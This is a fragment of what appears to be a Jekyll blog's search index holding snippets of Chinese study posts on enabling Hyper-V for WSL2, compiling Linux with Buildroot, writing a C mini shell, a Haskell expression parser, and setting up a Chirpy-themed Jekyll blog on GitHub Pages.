Powershell 中输入如下指令，启用 hyper-V ，使用 WSL2&amp;gt; bcdedit /set hypervisorlaunchtype auto参考链接 unable-to-boot-windows-10-guest-using-virtualbox-with-enabled-hyper-v-and-wsl2-i &amp;#8617; how-to-disable-hyper-v-in-command-line &amp;#8617; how-to-get-oracle-vm-virtualbox-6-0-and-wsl-working-at-the-same-time &amp;#8617; " }, { "title": "专业课 - 系统编程项目一 - 使用 Buildroot 编译 Linux 内核", "url": "/posts/MSI-System-Programming-TP1/", "categories": "Blogging, Study", "tags": "System Programming, Buildroot, Linux", "date": "2021-09-23 05:11:00 +0800", "snippet": "2021年9月22日，星期三，专业周第二天，讲操作系统和系统编程。 老师在下午布置了两个小项目，第一个是使用 Buildroot 来编译一个 Linux 内核，第二个是使用 C 语言编写一个 Linux 的 Mini shell。这篇 blog 主要讲第一个项目，第二个项目链接在此。操作系统Linux 系统Buildroot这个东西的意义在于帮助你制作一个 Linux 镜像，并且直接在里面以包的形式加上自己的软件，然后就可以将这个镜像发布出去。项目：使用 Buildroot 来编译一个 Linux 内核首先给一个 x86 的处理器编译一个 Linux 内核，然后为一个 RAM 处理器（比如树莓派）编译内核，由于处理器不同，两个编译的 Linux 内核也不同。1. 环境搭建具体参考 Buildroot 官方网站的 documentation如果是 linux， 则只需要下载一个官方的 Buildroot 压缩包然后解压之后照着 documentation 操作就行如果要在 windows 上操作，则需要首先创建一个 Linux 虚拟环境，或者按照官方的 doc 上说的使用 Vagrant 创建一个虚拟环境。推荐自己创建一个。2. 设置 make config如果要自定义一个内核，那就需要对编译进行设置一下。在 buildroot 的目录下输入$ make menuconfig然后就可以根据官方的文档对这些项目进行更改了。但是我们这里需要首先用官方给的 x86 标准设定。进入 build-x64 文件夹之后设定$ make menuconfig然后就可以退出来输入$ make进行等待就行了3. 在编译的 Linux 镜像里加入自己的包首先把自己的包的源文件加入到 build_root 文件夹的 Package 目录里然后 为其编写两个 文件 一个是 Config.in 文件用于把我们的包加入到 menuconfig 的选项里然后 xxx.mk 文件告诉 Buildroot 怎么编译。然后进入 build-x64 文件夹里，输入make menuconfig在 game 里选中 package然后make4. 制作启动盘将编译完的文件拷到一个U盘里，再在电脑上使用从U盘启动，这个U盘就可以作为一个Linux的启动盘了。参考链接" }, { "title": "专业课 - 系统编程项目二 - 使用 C 语言编写一个 Linux 的 Mini shell", "url": "/posts/MSI-System-Programming-TP2/", "categories": "Blogging, Study", "tags": "Functional Programming, C, Linux", "date": "2021-09-23 04:58:00 +0800", "snippet": "2021年9月22日，星期三，专业周第二天，讲操作系统和系统编程。 老师在下午布置了两个小项目，第一个是使用 Buildroot 来编译一个 Linux 内核，第二个是使用 C 语言编写一个 Linux 的 Mini shell。这篇 blog 主要讲第二个项目，第一个项目链接在此。Shell项目：使用 C 语言编写一个 Linux 的 Mini shell1. 环境搭建直接在一个 Linux 的环境里使用 C 语言编写就行了。2. 代码讲解首先导入需要的头文件#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;sys/types.h 是 Unix/Linux 系统的基本系统数据类型的头文件，含有size_t，time_t，pid_t等类型。unistd.h 是 unix std 的意思，是POSIX标准定义的unix类系统定义符号常量的头文件，包含了许多UNIX系统服务的函数原型。unistd.h 在 unix 中类似于 windows 中的 windows.h。3. 编译在 terminal 中输入gcc xxx.c -o xxx即可，其中第一个 xxx.c 是你的源文件的文件名，第二个文件是编译后输出的文件名。参考链接" }, { "title": "专业课 - 函数式编程小项目 - 基于Haskell编写的算术表达式语法分析器", "url": "/posts/MSI-Functional-programming/", "categories": "Blogging, Study", "tags": "Functional Programming, Haskell, Parser", "date": "2021-09-23 04:58:00 +0800", "snippet": "2021年9月21日，星期二，专业周第一天，讲函数式编程并且基于 Hakell 编写一个用于算术表达式的语法分析器函数式编程Haskell语法分析器 Parser项目：基于 Hakell 的算术表达式语法分析器1. 环境搭建环境搭建没有讲，用的是老师拷给我们的镜像，里面有安装好的 Haskell ， 有机会还是要自己研究一下。2. 下载并测试文件将文件全部下载到一个文件夹里，测试并熟悉编译过程。在终端输入gchigchi 是 Haskell 的解释器，可以直接执行 Haskell 的代码，然后输入:l xxx.hs其中 xxx.hs 是你写好的 Hakell 的文件，这样就可以把你事先自定义好的数据类型以及函数载入，然后可以直接执行了。3. 正式开始编写 Parser参考链接" }, { "title": "Blog - 免费搭建一个基于 Jekyll 的博客站点!", "url": "/posts/Hello-Jekyll/", "categories": "Blogging, Blog", "tags": "Blog, Jekyll", "date": "2021-09-17 00:00:00 +0800", "snippet": "这是该 Blog 自建立起的第一篇 Post ，主要用于记录建立这个站点的整个过程。前言这几天在研究怎么搭建一个专属的博客站点，一是用来记录自己学习知识和研究技术过程中的点点滴滴，二也是方便自己未来在需要的时候能够从中参考查阅。 其实很早以前就有这么一个想法了，但是一直没有落实。碰巧这段时间在实习之后有时间来完成这件事，同时实习过程中产生的大量的技术积累也需要进行沉淀和整理。最后呢也希望借助这个博客，自己能在未来的技术学习之路上养成一个记录、整理、反思的好习惯。博客搭建该博客是基于 GitHub Pages 和 Jekyll 完成搭建的，然后使用了 Jekyll 的第三方主题框架 Chirpy 来进行美化和功能扩展。GitHub Pages 和 Jekyll首先 GitHub Pages 的提供了一个基础的官方教程1，从配置一个博客专用的仓库，到把仓库内的静态网页内容交给 GitHub 托管, 再到结合 Jekyll 来自动化生成静态的博客框架，适合用来熟悉 GitHub Pages 以及 Jekyll 的相关知识以及操作。如果要自行搭建博客，建议过一遍这个基础教程。Jekyll 是一个用 Ruby 语言编写的静态网站框架生成器，可以理解为一个小程序。因此在安装 Jekyll 的时候需要首先安装 Ruby。在这过程中，涉及到许多和 Ruby 编程相关的知识与术语，罗列如下2： Ruby: 一种编程语言 Gem: 封装起来的 Ruby 应用程序或代码库，相当于 Python 中的 package 的概念 Jekyll: 基于 Ruby 编写的一个 Gem RubyGems: Ruby 的包管理器，相当于 Python 中的 pip，可以帮助安装、卸载、升级各种 Gem。在终端使用的 gem 命令，是指通过 RubyGems 管理 Gem 包 Bundle: 相当于多个 RubyGems 的批处理。在配置文件 gemfilel 里说明你的应用依赖哪些第三方包，它会自动帮你下载安装这些包以及这些包依赖的包 Gemfile: 定义你的应用依赖哪些第三方包，bundle 根据该配置去寻找这些包熟悉这些概念之后，便可以结合网上的各种教程来搭建自己的博客，在这里我放一个知乎看到的教程作为例子3以及一个我在 Youtube 看到的非常好的基于 Jekyll 的博客搭建教程4。Chirpy在熟悉搭建博客框架后，便可以上网找各种 Jekyll 主题来美化你的博客。这里我推荐一个 Jekyll Themes5 的主题网站，上面提供了大量的可供使用的主题。使用主题的教程可以参考我文章底部提供的 Youtube 的教程。各个主题框架的主页面也基本上都会有相关的使用教程。该博客站点的主题 Chirpy 就是在我上面提到的网站 Jekyll Themes 找到的。在该主题的 GitHub 主页6上，开发者也非常耐心地讲解了如何应用该主题。在这个主题的官方 Demo 页面上也有文章引导使用者如何进行一些自定义的配置。编写博文本地调试在本地可以直接测试搭建好的博客，在博客的目录下输入bundle exec jekyll serve如果成功搭建，输出会包含一个 http://127.0.0.1:4000/ 地址，在浏览器输入这个地址就可查看当前的博客了。主题框架的应用这里记录一下在本地部署应用这个主题框架的时候需要注意的一些要点，方便下次需要升级或者更换主题框架的时候参考。部署到 GitHub Pages本地部署的时候需要首先备份几个文件与文件夹： \\_config.yml 文件里记录着站点的基本信息 \\assets 文件夹里存放着站点部署需要的相关资源文件 \\posts 文件夹里存放着所有的文章 \\drafts 文件夹里存放着所有没有完成的草稿将这些文件与文件夹备份之后，按照新的主体框架的文档完成搭建，然后把需要的信息和文件资源全部复制回去即可。自定义主页头像在 \\_config.yml 文件中可以自定义主页的头像。只需要把 avatar: 后面的链接更换为自己头像的链接即可。目前我使用的图片上传网站为 SM.MS7，比较方便。自定义网页图标该主题也支持自定义网页的图标，在 Chirpy 的官方 Demo 上有一篇文章讲解了如何更换图标8，按照文章里的步骤做就可以了。 首先准备一张宽高相等的需要作为网站图标的图片，大小最好在 512 × 512 以上。 登陆这个专门制作图标的网站 Favicon Generator9，将图片上传 然后按照提示逐个设置图标需要的样式，完毕后将打包文件下载下来 解压，删除文件夹中的 browserconfig.xml 以及 site.webmanifest 两个文件，将剩下的文件复制到\\assets\\img\\favicons 目录覆盖即可。 完成后 push 到线上仓库即可。参考链接 GitHub Pages 官方教程 &amp;#8617; 整理 Ruby 相关的各种概念 &amp;#8617; 知乎: GitHub Pages 建立个人网站详细教程 &amp;#8617; Youtube: Jekyll 搭建个人博客 &amp;#8617; Jekyll Themes &amp;#8617; Chirpy &amp;#8617; SM.MS 图片上传网站 &amp;#8617; Chirpy: Customize the Favicon &amp;#8617; Favicon generator &amp;#8617; " } ]
